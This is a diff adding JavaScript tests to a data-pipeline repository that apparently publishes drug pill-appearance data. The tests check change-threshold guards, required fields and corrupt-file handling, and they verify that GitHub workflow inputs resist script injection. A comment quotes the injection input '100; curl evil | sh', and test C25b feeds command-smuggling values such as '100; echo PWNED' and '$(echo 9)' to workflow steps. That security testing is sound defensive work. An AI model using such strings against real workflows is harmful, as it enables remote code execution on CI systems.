@@ -213,6 +213,117 @@ test('C4b 變動幅度守門：>3% 中止、--allow-any-delta 可放行，且與
   assert.equal(fingerprint(ws.dir), before, '放行只產生 staging，不得改動已發布版本');
 });
 
+test('C4c 同筆數置換 id：移除 51 筆中止、移除 50 筆通過（M4：幅度 0% 也擋得住）', () => {
+  // 筆數不變時 ratio = 0，**只剩「移除 >50」這道**在守。沒有這條，
+  // 把 MAX_DELTA_REMOVED 刪掉或改成 >= 都不會有任何測試變紅。
+  const replaced = (n) => srcRows(5100).map((r, i) => (i < n
+    ? { ...r, 許可證字號: `衛署藥輸字第${String(900000 + i)}號` }
+    : r));
+  const ws = workspace();
+  publish(ws, srcRows(5100));
+  const before = fingerprint(ws.dir);
+
+  const r51 = run(['--source', writeZip(ws.dir, replaced(51)), '--out', ws.out, '--vocab-lock', ws.lock]);
+  assert.notEqual(r51.code, 0, 'C4c: 置換 51 個 id 應中止');
+  assert.match(r51.stderr, /變動幅度超出門檻/);
+  assert.match(r51.stdout, /新增 51／移除 51，幅度 0\.00%/);
+  assert.equal(fingerprint(ws.dir), before);
+
+  const r50 = run(['--source', writeZip(ws.dir, replaced(50)), '--out', ws.out, '--vocab-lock', ws.lock]);
+  assert.equal(r50.code, 0, `C4c: 置換 50 個 id 應通過：${r50.stderr}`);
+  assert.equal(fingerprint(ws.dir), before);
+});
+
+test('C4d 幅度邊界：+2.9% 通過、+3.1% 中止（只動筆數、不移除）', () => {
+  const ws = workspace();
+  publish(ws, srcRows(6000));
+  const before = fingerprint(ws.dir);
+
+  const ok = run(['--source', writeZip(ws.dir, srcRows(6174)), '--out', ws.out, '--vocab-lock', ws.lock]);
+  assert.equal(ok.code, 0, `C4d: +2.9% 應通過：${ok.stderr}`);
+  assert.match(ok.stdout, /移除 0，幅度 2\.90%/);
+
+  const bad = run(['--source', writeZip(ws.dir, srcRows(6186)), '--out', ws.out, '--vocab-lock', ws.lock]);
+  assert.notEqual(bad.code, 0, 'C4d: +3.1% 應中止');
+  assert.match(bad.stdout, /移除 0，幅度 3\.10%/);
+  assert.match(bad.stderr, /變動幅度超出門檻/);
+  assert.equal(fingerprint(ws.dir), before);
+});
+
+test('C22 必要欄位含「標註二」與「外觀尺寸」：缺任一即中止（M3）', () => {
+  // 缺「標註二」時 toItem 會把 6,000 筆的 mark2 全寫成 null——不報錯、只是靜靜少掉
+  // 一半的刻字 token，而 D3 的跨欄聯集正是靠這一欄。
+  const ws = workspace();
+  publish(ws, srcRows(5100));
+  const before = fingerprint(ws.dir);
+  for (const f of ['標註二', '外觀尺寸']) {
+    const rows = srcRows(5100).map((r) => { const o = { ...r }; delete o[f]; return o; });
+    const r = run(['--source', writeZip(ws.dir, rows), '--out', ws.out, '--vocab-lock', ws.lock]);
+    assert.notEqual(r.code, 0, `C22: 來源缺「${f}」被放行`);
+    assert.equal(fingerprint(ws.dir), before);
+    assert.equal(fs.existsSync(`${ws.out}.staging`), false, 'C22: staging 殘留');
+  }
+  // 對照組
+  const ok = run(['--source', writeZip(ws.dir, srcRows(5100)), '--out', ws.out, '--vocab-lock', ws.lock]);
+  assert.equal(ok.code, 0, ok.stderr);
+});
+
+test('C23 欄位非空筆數對前版變動超出門檻即中止，--allow-any-delta 可放行（M3）', () => {
+  // 筆數與 id 都不變、只有某一欄被整批清空或錯位，C4 系列的守門全部看不到。
+  // 清空刻字欄 → 那批藥全部改落未提供區；錯位 → 變成錯的 token → 直接漏檢。
+  const N = 5100;
+  const base = srcRows(N, (i) => ({ 標註二: i % 2 ? 'B 2' : null }));
+  const ws = workspace();
+  publish(ws, base);
+  const before = fingerprint(ws.dir);
+
+  const FIELDS = [
+    ['mark1', (r) => ({ ...r, 標註一: '' })],
+    // 暴增方向：前 200 筆中原本為空的 100 筆被灌值（模擬他欄錯位）。
+    // 不可寫成「有值清空、空值灌值」——200 筆一半增一半減，淨變動 0，測到的是別的事。
+    ['mark2', (r) => ({ ...r, 標註二: 'NEW 9' })],
+    ['color', (r) => ({ ...r, 顏色: '' })],
+    ['shape', (r) => ({ ...r, 形狀: '' })],
+    ['score_mark', (r) => ({ ...r, 刻痕: '' })],
+  ];
+  for (const [field, mut] of FIELDS) {
+    const bigRows = base.map((r, i) => (i < 200 ? mut(r) : r));        // 200 > max(50, 3%)
+    const big = run(['--source', writeZip(ws.dir, bigRows), '--out', ws.out, '--vocab-lock', ws.lock]);
+    assert.notEqual(big.code, 0, `C23: ${field} 變動 200 筆被放行`);
+    assert.match(big.stderr, new RegExp(`欄位非空筆數變動超出門檻.*${field}`, 's'));
+    assert.equal(fingerprint(ws.dir), before);
+
+    const smallRows = base.map((r, i) => (i < 40 ? mut(r) : r));       // 對照組：40 筆應通過
+    const small = run(['--source', writeZip(ws.dir, smallRows), '--out', ws.out, '--vocab-lock', ws.lock]);
+    assert.equal(small.code, 0, `C23: ${field} 變動 40 筆應通過：${small.stderr}`);
+
+    const forced = run(['--source', writeZip(ws.dir, bigRows), '--out', ws.out, '--vocab-lock', ws.lock,
+      '--allow-any-delta']);
+    assert.equal(forced.code, 0, `C23: ${field} 人工放行後應可通過`);
+    assert.equal(fingerprint(ws.dir), before);
+  }
+});
+
+test('C24 前版 appearance.json 損毀時不得靜默關閉 delta 守門（Low）', () => {
+  // 原本 `catch {}` 視同無前版 → 走「首次建置」→ 變動守門與非空筆數守門全部跳過，
+  // 且 carryHashes 讀不到前版 → 全量重抓 6,798 張。
+  const ws = workspace();
+  publish(ws, srcRows(5100));
+  for (const garbage of ['{"meta":', '{"meta":{"schema":1},"items":"x"}']) {
+    fs.writeFileSync(ws.out, garbage, 'utf8');
+    const before = fingerprint(ws.dir);
+    const r = run(['--source', writeZip(ws.dir, srcRows(5100)), '--out', ws.out, '--vocab-lock', ws.lock]);
+    assert.notEqual(r.code, 0, `C24: 前版損毀（${garbage}）被當成首建`);
+    assert.match(r.stderr, /前版.*(損毀|無法解析|結構)/);
+    assert.equal(fingerprint(ws.dir), before);
+  }
+  // 對照組：前版不存在 → 首建仍可通過
+  fs.unlinkSync(ws.out);
+  const ok = run(['--source', writeZip(ws.dir, srcRows(5100)), '--out', ws.out, '--vocab-lock', ws.lock]);
+  assert.equal(ok.code, 0, ok.stderr);
+  assert.match(ok.stdout, /無前版，視為首次建置/);
+});
+
 // ── C5 id 唯一 ──────────────────────────────────────────────────────
 
 test('C5 許可證字號重複 → 中止並指出該 id 與次數（其他資料保持合法、總筆數不變）', () => {
@@ -902,4 +1013,125 @@ test('C20b 掃描器本身有效 —— 對照組（沒有這條，C20 可能是
   assert.deepEqual(localDeps(decoy), [], 'C20b: 註解裡的 import 被誤判為真的依賴');
 
   fs.rmSync(tmp, { recursive: true, force: true });
+});
+
+// ── C25／C26 workflow 輸入與原始碼衛生（2026-10 覆審 Low）─────────────
+
+/**
+ * 取出某支 workflow 裡**名稱含 `stepName`** 的 step 的 `run:` 與 `env:`（已剝註解）。
+ * 只認本 repo 用到的兩種寫法：`run: |`／`run: >` 區塊，與單行 `run: <cmd>`。
+ */
+function stepOf(file, stepName) {
+  const { lines } = workflows().find((w) => w.file === file);
+  const at = lines.findIndex((l) => /^\s*- name:/.test(l) && l.includes(stepName));
+  assert.ok(at >= 0, `${file} 找不到 step「${stepName}」`);
+  const indent = lines[at].indexOf('-') + 2;
+  const body = [];
+  for (let i = at + 1; i < lines.length; i++) {
+    const l = lines[i];
+    if (l.trim() === '') { body.push(''); continue; }
+    if (l.search(/\S/) < indent) break;
+    body.push(l);
+  }
+  const keyBlock = (key) => {
+    const k = body.findIndex((l) => new RegExp(`^\\s*${key}:`).test(l));
+    if (k < 0) return null;
+    const own = body[k].search(/\S/);
+    const inline = body[k].replace(new RegExp(`^\\s*${key}:\\s*`), '');
+    const rest = [];
+    for (let i = k + 1; i < body.length && (body[i] === '' || body[i].search(/\S/) > own); i++) rest.push(body[i]);
+    const minIndent = Math.min(...rest.filter(Boolean).map((l) => l.search(/\S/)));
+    return { inline, block: rest.map((l) => l.slice(Number.isFinite(minIndent) ? minIndent : 0)) };
+  };
+  return { run: keyBlock('run'), env: keyBlock('env') };
+}
+
+/** 以 bash 實跑某 step 的 run 腳本；`stubs` 是在腳本前宣告的 shell 函式（攔截 node／uv）。 */
+function runStep(step, env, stubs) {
+  const script = step.run.inline.startsWith('>')
+    ? step.run.block.join(' ')                        // folded：換行折成空白
+    : step.run.block.join('\n');
+  try {
+    const out = execFileSync('bash', ['-c', `set -euo pipefail\n${stubs}\n${script}`],
+      { encoding: 'utf8', env: { PATH: process.env.PATH, ...env }, stdio: ['ignore', 'pipe', 'pipe'] });
+    return { code: 0, out };
+  } catch (e) {
+    return { code: e.status ?? -1, out: `${e.stdout ?? ''}${e.stderr ?? ''}` };
+  }
+}
+
+test('C25 workflow 的 run 腳本不得直接內插 ${{ }} —— 輸入一律走 env（防 script injection）', () => {
+  // `${{ github.event.inputs.x }}` 在 run 裡是**字串替換後才交給 shell**，
+  // 輸入 `100; curl evil | sh` 就是一行指令。走 env 的話它只是一個變數值。
+  let runBlocks = 0;
+  for (const { file, lines } of workflows()) {
+    for (let i = 0; i < lines.length; i++) {
+      const m = lines[i].match(/^(\s*)(- )?run:/);
+      if (!m) continue;
+      runBlocks++;
+      const own = lines[i].search(/run:/);
+      const chunk = [lines[i]];
+      for (let j = i + 1; j < lines.length && (lines[j].trim() === '' || lines[j].search(/\S/) > own); j++) chunk.push(lines[j]);
+      assert.doesNotMatch(chunk.join('\n'), /\$\{\{/, `C25: ${file} 第 ${i + 1} 行的 run 腳本直接內插了 \${{ }}`);
+    }
+  }
+  assert.ok(runBlocks >= 10, `C25: 對照組失效 —— 只掃到 ${runBlocks} 個 run 區塊`);
+});
+
+test('C25b verify-images 的 sample 走 env 且實跑驗證為正整數（非法值不得進到 fetch-images）', () => {
+  const step = stepOf('verify-images.yml', '新鮮度檢查');
+  assert.ok(step.env && step.env.block.some((l) => /^SAMPLE:\s*\$\{\{.*inputs\.sample/.test(l)),
+    'C25b: sample 沒有經由 env.SAMPLE 傳入');
+  const stubs = 'uv() { echo "UV $*"; }';
+  for (const ok of ['100', '5', '1000']) {
+    const r = runStep(step, { SAMPLE: ok }, stubs);
+    assert.equal(r.code, 0, `C25b: SAMPLE=${ok} 應通過：${r.out}`);
+    assert.match(r.out, new RegExp(`UV run tools/fetch-images\\.py .*--sample ${ok}\\b`));
+  }
+  for (const bad of ['', '0', '-1', '1.5', 'abc', '100; echo PWNED', '$(echo 9)', '99999']) {
+    const r = runStep(step, { SAMPLE: bad }, stubs);
+    assert.notEqual(r.code, 0, `C25b: SAMPLE=${JSON.stringify(bad)} 被放行`);
+    assert.doesNotMatch(r.out, /UV run/, `C25b: SAMPLE=${JSON.stringify(bad)} 仍呼叫了 fetch-images`);
+    // 錯誤訊息會回顯輸入，所以只認「自成一行」的 PWNED——那才代表注入的指令真的執行了
+    assert.doesNotMatch(r.out, /^PWNED$/m, `C25b: SAMPLE=${JSON.stringify(bad)} 的注入被執行`);
+  }
+});
+
+test('C25c update-data 的 allow_any_delta 為 boolean 輸入，只有 true 才加 --allow-any-delta', () => {
+  // 用剝過註解、去掉空行的版本：解釋這個輸入的註解夾在 inputs: 與鍵之間
+  const wf = workflows().find((w) => w.file === 'update-data.yml').lines.filter((l) => l.trim()).join('\n');
+  assert.match(wf, /workflow_dispatch:\s*\n\s+inputs:\s*\n\s+allow_any_delta:[\s\S]*?type:\s*boolean[\s\S]*?default:\s*false/,
+    'C25c: 缺 boolean 的 allow_any_delta 輸入（預設必須 false）');
+  const step = stepOf('update-data.yml', '建置 canonical');
+  assert.ok(step.env && step.env.block.some((l) => /^ALLOW_ANY_DELTA:\s*\$\{\{.*inputs\.allow_any_delta/.test(l)),
+    'C25c: allow_any_delta 沒有經由 env 傳入');
+  const stubs = 'node() { echo "NODE $*"; }';
+  const yes = runStep(step, { ALLOW_ANY_DELTA: 'true' }, stubs);
+  assert.equal(yes.code, 0, yes.out);
+  assert.match(yes.out, /NODE tools\/fetch-appearance\.mjs --allow-any-delta/);
+  // 排程觸發時 inputs 不存在 → 空字串；以及任何非 'true' 的值，都不得放行
+  for (const v of ['', 'false', 'TRUE', '1', 'true; echo x']) {
+    const r = runStep(step, { ALLOW_ANY_DELTA: v }, stubs);
+    assert.equal(r.code, 0, r.out);
+    assert.match(r.out, /NODE tools\/fetch-appearance\.mjs/, 'C25c: 對照組——建置本身必須照跑');
+    assert.doesNotMatch(r.out, /--allow-any-delta/, `C25c: ALLOW_ANY_DELTA=${JSON.stringify(v)} 被當成放行`);
+  }
+});
+
+test('C26 原始碼不得含字面 NUL 字元（工具會把檔案當 binary，grep／diff／review 全部失明）', () => {
+  // verify-data.mjs 曾以字面 U+0000 當 Map 鍵分隔符：`git diff` 顯示 Binary files differ、
+  // `grep` 回「binary file matches」，那一行在 review 時等於隱形。
+  const exts = /\.(m?js|py|ya?ml|json|md|html)$/;
+  const dirs = ['.', 'tools', 'tests', '.github/workflows', '.ai-review'];
+  let scanned = 0;
+  for (const d of dirs) {
+    for (const f of fs.readdirSync(path.join(ROOT, d))) {
+      const p = path.join(ROOT, d, f);
+      if (!exts.test(f) || !fs.statSync(p).isFile()) continue;
+      if (/baseline-|expected-/.test(f)) continue;           // 凍結資料檔，不是原始碼
+      scanned++;
+      assert.equal(fs.readFileSync(p).indexOf(0), -1, `C26: ${path.relative(ROOT, p)} 含字面 NUL`);
+    }
+  }
+  assert.ok(scanned >= 20, `C26: 對照組失效 —— 只掃了 ${scanned} 個檔`);
 });
